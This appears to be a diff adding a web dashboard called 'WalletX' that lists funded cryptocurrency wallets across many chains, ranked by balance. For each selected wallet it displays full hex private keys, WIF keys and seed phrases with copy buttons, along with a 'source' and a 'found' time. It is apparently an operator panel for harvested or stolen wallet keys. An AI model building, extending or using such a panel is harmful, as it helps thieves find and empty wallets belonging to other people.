@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#000000">
+<title>WalletX</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#fff;font:14px/1.5 monospace;overflow-x:hidden}
+#app{max-width:100%;margin:0 auto;padding:8px}
+hdr{display:flex;align-items:center;gap:12px;padding:12px 8px;border-bottom:2px solid #ff8c00;margin-bottom:8px;flex-wrap:wrap}
+hdr .logo{font-size:22px;font-weight:bold;color:#ff8c00}
+hdr .stat{font-size:12px;color:#888}
+hdr .stat .val{color:#ffd700}
+hdr .live{color:#0f0}
+#stats{display:flex;gap:16px;flex-wrap:wrap;padding:8px;background:#111;border-radius:4px;margin-bottom:8px}
+#stats .s{font-size:11px;color:#888}
+#stats .s .n{color:#ffd700;font-weight:bold}
+#bar{display:flex;gap:8px;padding:8px 0;flex-wrap:wrap}
+#bar input,#bar select,#bar button{padding:8px 12px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:4px;font:inherit}
+#bar input{flex:1;min-width:200px}
+#bar button{background:#ff8c00;color:#000;font-weight:bold;border:none;cursor:pointer}
+#main{display:flex;gap:8px;height:calc(100vh - 200px)}
+#lb{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:280px}
+#dt{flex:1;overflow-y:auto;border:1px solid #333;border-radius:4px;background:#0a0a0a;min-width:280px;padding:12px}
+.wal{padding:8px 12px;border-bottom:1px solid #1a1a1a;cursor:pointer;display:flex;gap:8px;align-items:center;font-size:13px}
+.wal:hover{background:#1a1a1a}
+.wal.on{background:#2a1a00;border-left:3px solid #ff8c00}
+.wal .r{color:#ff8c00;font-weight:bold;min-width:32px}
+.wal .c{color:#0af;min-width:40px;font-size:11px}
+.wal .bal{color:#0f0;text-align:right;min-width:100px}
+.wal .adr{color:#999;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:200px}
+#dt .sec{margin-bottom:16px}
+#dt .lbl{color:#ff8c00;font-weight:bold;display:block;margin-bottom:4px}
+#dt .val{word-break:break-all;font-size:13px;line-height:1.6;color:#ffd700}
+#dt .btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
+#dt .btns button{padding:6px 12px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:4px;cursor:pointer;font:inherit;font-size:12px}
+#dt .btns button:hover{background:#2a1a00}
+#key pre{white-space:pre-wrap;word-break:break-all;font-size:10px;color:#ffd700;background:#0a0a0a;padding:8px;border:1px solid #333;border-radius:4px;margin:4px 0}
+.nav{display:flex;gap:8px;justify-content:center;padding:12px}
+.nav button{padding:10px 24px;background:#ff8c00;color:#000;font-weight:bold;border:none;border-radius:4px;cursor:pointer;font:inherit;font-size:14px}
+.nav button:disabled{opacity:.4}
+.nav .pg{color:#888;font-size:13px;align-self:center}
+#toast{position:fixed;bottom:20px;right:20px;background:#ff8c00;color:#000;padding:12px 20px;border-radius:4px;font-weight:bold;display:none;z-index:99}
+#err{color:#f44;padding:8px}
+@media(max-width:768px){#main{flex-direction:column;height:auto}#lb,#dt{max-height:50vh}}
+</style>
+</head>
+<body>
+<div id="app">
+<hdr>
+<div class="logo">&#x1F525; WALLETX</div>
+<div class="stat">Total: <span class="val" id="stTotal">-</span></div>
+<div class="stat">Funded: <span class="val" id="stFunded">-</span></div>
+<div class="stat">Hits: <span class="val" id="stHits">-</span></div>
+<div class="stat" id="stLive">-</div>
+<span style="flex:1"></span>
+<div class="stat" id="clock">--</div>
+</hdr>
+<div id="stats"></div>
+<div id="bar">
+<input type="text" id="q" placeholder="Search address fragment...">
+<select id="chainFilter"><option value="">All chains</option><option>ETH</option><option>MATIC</option><option>BTC</option><option>SOL</option><option>BNB</option><option>AVAX</option><option>BASE</option><option>ARB</option><option>OP</option><option>LTC</option><option>DOGE</option><option>XRP</option><option>MONAD</option></select>
+<select id="sortBy"><option value="balance">Balance</option><option value="ts">Recent</option><option value="chain">Chain</option></select>
+<button onclick="load()">Filter</button>
+<button onclick="location.reload()">Refresh</button>
+</div>
+<div id="err"></div>
+<div id="main">
+<div id="lb"></div>
+<div id="dt"><div style="color:#666;text-align:center;margin-top:40px">Select a wallet</div></div>
+</div>
+<div class="nav">
+<button onclick="prevPage()" id="btnPrev">Prev</button>
+<span class="pg" id="pgInfo">Page 1</span>
+<button onclick="nextPage()" id="btnNext">Next</button>
+</div>
+</div>
+<div id="toast"></div>
+<script>
+var PAGE=0,PERPAGE=50,TOTAL=0,focus=null,wallets=[];
+
+function load(){
+ var u='/api/balances?limit='+PERPAGE+'&offset='+(PAGE*PERPAGE)+'&funded_only=true&sort_by='+document.getElementById('sortBy').value;
+ var c=document.getElementById('chainFilter').value;if(c)u+='&chain='+c;
+ var q=document.getElementById('q').value;if(q)u='/api/search?q='+encodeURIComponent(q)+'&limit='+PERPAGE+'&offset='+(PAGE*PERPAGE);
+ fetch(u).then(function(r){return r.json()}).then(function(d){
+  wallets=d.rows||d;TOTAL=d.total||wallets.length;
+  return fetch('/api/stats');
+ }).then(function(r){return r.json()}).then(function(s){
+  document.getElementById('stTotal').textContent=s.total;
+  document.getElementById('stFunded').textContent=s.nonzero;
+  document.getElementById('stHits').textContent=s.hits;
+  var live=s.last_check_ts&&(Date.now()/1000-s.last_check_ts)<300;
+  document.getElementById('stLive').innerHTML=live?'<span class="live">&#x25CF; LIVE</span>':'<span style="color:#666">&#x25CB; CACHED</span>';
+  document.getElementById('clock').textContent=new Date().toISOString().slice(11,19)+' UTC';
+  var sh='';
+  if(s.chain_totals)for(var c in s.chain_totals)sh+='<span class="s"><span class="n">'+c+'</span> '+s.chain_totals[c].toFixed(2)+'</span> ';
+  document.getElementById('stats').innerHTML=sh;
+  renderLb();
+  document.getElementById('pgInfo').textContent='Page '+(PAGE+1)+' / '+Math.ceil(TOTAL/PERPAGE)+' ('+TOTAL+' total)';
+  document.getElementById('btnPrev').disabled=PAGE<=0;
+  document.getElementById('btnNext').disabled=(PAGE+1)*PERPAGE>=TOTAL;
+  document.getElementById('err').innerHTML='';
+ }).catch(function(e){
+  document.getElementById('err').innerHTML='Load failed: '+e.message;
+ });
+}
+
+function renderLb(){
+ var lb=document.getElementById('lb'),h='';
+ wallets.forEach(function(w,i){
+  var bal=w.balance,bs;
+  if(!bal&&bal!==0)bs='...';
+  else if(bal>1e6)bs=(bal/1e6).toFixed(1)+'M';
+  else if(bal>1)bs=bal.toFixed(2);
+  else bs=bal.toFixed(8);
+  var addr=w.address||'',as=addr.length>24?addr.slice(0,12)+'...'+addr.slice(-10):addr;
+  h+='<div class="wal'+(focus===i?' on':'')+'" onclick="showDetail('+i+')">';
+  h+='<span class="r">#'+(PAGE*PERPAGE+i+1)+'</span>';
+  h+='<span class="c">'+(w.chain||'?').toUpperCase()+'</span>';
+  h+='<span class="bal">'+bs+'</span>';
+  h+='<span class="adr" title="'+addr+'">'+as+'</span>';
+  h+='</div>';
+ });
+ lb.innerHTML=h||'<div style="color:#666;padding:12px">No wallets found</div>';
+}
+
+function showDetail(i){
+ focus=i;renderLb();
+ var w=wallets[i],d=document.getElementById('dt');
+ var bal=w.balance,bs;
+ if(!bal&&bal!==0)bs='...';
+ else if(bal>1e6)bs=(bal/1e6).toFixed(6)+'M';
+ else if(bal>1)bs=bal.toFixed(6);
+ else bs=bal.toFixed(12);
+ var h='';
+ h+='<div class="sec"><span class="lbl">RANK</span><span class="val">#'+(PAGE*PERPAGE+i+1)+' / '+TOTAL+'</span></div>';
+ h+='<div class="sec"><span class="lbl">CHAIN</span><span class="val">'+(w.chain||'?').toUpperCase()+'</span></div>';
+ h+='<div class="sec"><span class="lbl">ADDRESS</span><span class="val" style="font-size:11px">'+(w.address||'')+'</span></div>';
+ h+='<div class="sec"><span class="lbl">BALANCE</span><span class="val">'+bs+'</span></div>';
+ h+='<div class="sec"><span class="lbl">CHECKED</span><span class="val">'+(w.checked_at||'unknown')+'</span></div>';
+ h+='<div class="sec"><span class="lbl">STATUS</span><span class="val">'+(w.live?'LIVE':'CACHED')+' '+(w.settled?'SETTLED':'')+'</span></div>';
+ h+='<div class="btns"><button onclick="copyText(\''+(w.address||'').replace(/'/g,"&#39;")+'\')">Copy Address</button><button onclick="openExp(\''+(w.chain||'eth')+'\',\''+(w.address||'').replace(/'/g,"&#39;")+'\')">Explorer</button></div>';
+ h+='<div id="key" style="margin-top:16px"><span style="color:#888">Loading keys...</span></div>';
+ d.innerHTML=h;
+ var addr=encodeURIComponent(w.address||'');
+ fetch('/api/wallet/'+addr).then(function(r){return r.json()}).then(function(kd){
+  var ks=document.getElementById('key');
+  if(!kd.found){ks.innerHTML='<div class="sec"><span class="lbl">KEYS</span><span class="val" style="color:#888">'+kd.reason+'</span></div>';return}
+  var kh='<div class="sec"><span class="lbl">KEY MATERIAL (FULL)</span></div>';
+  if(kd.hex_keys&&kd.hex_keys.length){
+   kh+='<div class="sec"><span class="lbl">HEX PRIVATE KEYS ('+kd.hex_keys.length+')</span>';
+   kd.hex_keys.forEach(function(k,j){kh+='<div><pre>['+(j+1)+'] '+k+'</pre><button onclick="copyText(\''+k+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">Copy</button></div>'});
+   kh+='</div>';
+  }
+  if(kd.wifs&&kd.wifs.length){
+   kh+='<div class="sec"><span class="lbl">WIF KEYS ('+kd.wifs.length+')</span>';
+   kd.wifs.forEach(function(k,j){kh+='<div><pre>['+(j+1)+'] '+k+'</pre><button onclick="copyText(\''+k+'\')" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">Copy</button></div>'});
+   kh+='</div>';
+  }
+  if(kd.seeds&&kd.seeds.length){
+   kh+='<div class="sec"><span class="lbl">SEED PHRASES ('+kd.seeds.length+')</span>';
+   kd.seeds.forEach(function(k,j){var sid='s'+j+Date.now();window[sid]=k;kh+='<div><pre>['+(j+1)+'] '+k+'</pre><button data-copy="'+sid+'" class="cbtn" style="font-size:10px;padding:2px 6px;background:#1a1a1a;color:#ff8c00;border:1px solid #ff8c00;border-radius:2px;cursor:pointer">Copy</button></div>'});
+   kh+='</div>';
+  }
+  if(kd.source){kh+='<div class="sec"><span class="lbl">SOURCE</span><span class="val" style="font-size:11px">'+kd.source+'</span></div>'}
+  if(kd.timestamp){kh+='<div class="sec"><span class="lbl">FOUND</span><span class="val">'+kd.timestamp+'</span></div>'}
+  ks.innerHTML=kh;
+ }).catch(function(e){document.getElementById('key').innerHTML='<span style="color:#f44">Key lookup failed</span>'});
+}
+
+function copyText(t){navigator.clipboard.writeText(t);var x=document.getElementById('toast');x.textContent='Copied!';x.style.display='block';setTimeout(function(){x.style.display='none'},2000)}
+document.addEventListener('click',function(e){var b=e.target.closest('.cbtn');if(b){var id=b.getAttribute('data-copy');if(id&&window[id])copyText(window[id])}});
+function openExp(c,a){var u={ETH:'https://etherscan.io/address/'+a,MATIC:'https://polygonscan.com/address/'+a,BTC:'https://mempool.space/address/'+a,SOL:'https://solscan.io/account/'+a,BNB:'https://bscscan.com/address/'+a,AVAX:'https://snowtrace.io/address/'+a,BASE:'https://basescan.org/address/'+a,ARB:'https://arbiscan.io/address/'+a,OP:'https://optimistic.etherscan.io/address/'+a,LTC:'https://litecoinspace.org/address/'+a};window.open(u[c.toUpperCase()]||u.ETH,'_blank')}
+function prevPage(){if(PAGE>0){PAGE--;load()}}
+function nextPage(){PAGE++;load()}
+document.addEventListener('keydown',function(e){if(e.key==='ArrowRight')nextPage();if(e.key==='ArrowLeft')prevPage()});
+load();
+setInterval(load,10000);
+</script>
+</body>
+</html>
